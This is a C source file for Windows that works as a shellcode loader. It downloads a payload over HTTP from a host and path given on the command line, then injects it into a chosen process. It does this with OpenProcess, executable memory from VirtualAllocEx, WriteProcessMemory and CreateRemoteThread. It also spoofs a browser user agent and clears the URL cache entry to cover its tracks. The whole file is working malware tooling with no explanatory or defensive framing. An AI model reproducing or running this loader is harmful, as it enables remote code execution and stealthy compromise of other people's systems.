#pragma comment(lib, "wininet.lib")

#include <Windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>

struct memory
{
    char* buff;
    size_t prevSize;
};

// Error Checking function for HINTERNET
void hErrorCheck(const HINTERNET handle, const LPCSTR funcName)
{
    if (handle == NULL)
    {
        const DWORD errorCode = GetLastError();
        printf("%s failed with %lu\n", funcName, errorCode);
        //getchar();
        exit(-1);
    }
    //printf("[*] %s works!\n", funcName);
}

// Error checking for BOOL
void bErrorCheck(const BOOL ret, const LPCSTR funcName)
{
    if (ret == FALSE)
    {
        const int errorCode = GetLastError();
        printf("%s failed with %d\n", funcName, errorCode);
        //getchar();
        exit(-1);
    }
    //printf("[*] %s works!\n", funcName);
}


int main(int argc, char* argv[])
{
    // Set user agent and get handle for other wininet function
    const HINTERNET hOpen = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.3", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    hErrorCheck(hOpen, "InternetOpenA");

    // Get handle to the session if connection is successfull
    const HINTERNET hConnect = InternetConnectA(hOpen, argv[1], 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    hErrorCheck(hConnect, "InternetConnectA");

    // Get an http request handle
    //char **acceptTypes = { "text/*", NULL };
    const HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", argv[2], "HTTP/1.0", NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    hErrorCheck(hRequest, "InternetOpenRequestA");

    // Send request to the http server
    const BOOL bRequest = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
    bErrorCheck(bRequest, "HttpSendRequestA");


    DWORD bytesAvailable;
    DWORD bytesRead;
    struct memory chunk;
    chunk.buff = malloc(1); // Grows as need by realloc
    chunk.prevSize = 0; // Currently holding no data

    // Gets available bytes and stores them in "bytesAvailable
    while (InternetQueryDataAvailable(hRequest, &bytesAvailable, 0, 0))
    {
        // Allocates memory of size bytesAvailable
        char* pMessageBody = malloc(bytesAvailable + 1);
        if (pMessageBody == NULL)
        {
            printf("Malloc failed\n");
            exit(-1);
        }

        // Reads response body into pMessageBody
        const BOOL bFile = InternetReadFile(hRequest, pMessageBody, bytesAvailable, &bytesRead);
        bErrorCheck(bFile, "InernetReadFile");

        // Reallocate chunk->buff to hold newly copied data with old data
        char* ptr = realloc(chunk.buff, chunk.prevSize + bytesRead + 1);
        if (ptr == NULL)
        {
            printf("Realloc failed\n");
            exit(-1);
        }
        chunk.buff = ptr;

        // Copy retreived data after previously retrieved data
        memcpy(&(chunk.buff[chunk.prevSize]), pMessageBody, bytesRead);
        chunk.prevSize += bytesRead;
        //chunk.buff[chunk.prevSize] = '0';

        // Freeing allocated memory
        free(pMessageBody);

        // Read 0 means end of file
        if (bytesRead == 0)
            break;
    }
    //printf("%s", chunk.buff);

    // Open handle to PID in argv[3]
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[3]));
    if (hProc == NULL)
    {
        printf("[!] OpenProcess failed with: %lu\n", GetLastError());
        exit(-1);
    }
    LPVOID pRemoteBuff = VirtualAllocEx(hProc, NULL, chunk.prevSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteBuff == NULL)
    {
        printf("[!] VirtualAllocEx failed with: %lu\n", GetLastError());
        exit(-1);        
    }
    if (WriteProcessMemory(hProc, pRemoteBuff, chunk.buff, chunk.prevSize, NULL) == 0)
    {
        printf("[!] WriteProcessMemory failed with: %lu", GetLastError());
        exit(-1);
    }

    HANDLE hProcThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuff, NULL, 0, NULL);
    if (hProcThread == NULL)
    {
        printf("[!] CreateRemoteThread failed with: %lu", GetLastError());
        exit(-1);
    }

    // Cleanup
    DeleteUrlCacheEntryA(argv[1]);
    InternetCloseHandle(hOpen);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hRequest);
    CloseHandle(hProc);
    CloseHandle(hProcThread);
    free(chunk.buff);
    return 0;
}
